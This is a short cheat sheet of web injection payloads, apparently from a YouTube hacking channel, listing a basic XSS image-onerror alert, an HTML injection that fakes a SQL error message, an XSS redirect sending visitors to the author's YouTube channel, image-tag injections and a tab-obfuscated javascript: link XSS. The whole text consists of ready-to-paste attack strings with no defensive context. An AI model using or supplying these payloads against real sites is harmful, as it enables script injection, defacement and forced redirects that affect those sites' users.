Basic XSS:
       |
       |_ "><img src=x onerror=alert(document.domain) >

ERROR based injection :
                   |
                   |_ '<font color="red">ERROR 1064 (42000): Rohith had made an error in your Search Field;.jpg'

Open Redirect : SUBSCRIBE , LIKE & SHARE
          |
          |_ "><img src=x onerror="window.location.href='https://www.youtube.com/@hackwithrohit-new-2k';">

                               
IMAGE INJECTION :
            |
            |_ <img src=https://cdn.pixabay.com/animation/2023/09/07/21/54/21-54-00-174_512.gif >

               "><img src=https://cdn.pixabay.com/animation/2023/09/07/21/54/21-54-00-174_512.gif >


CONSOLE LOG :
         |
         |_ <a href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:console.log(1337)">XSS</a>
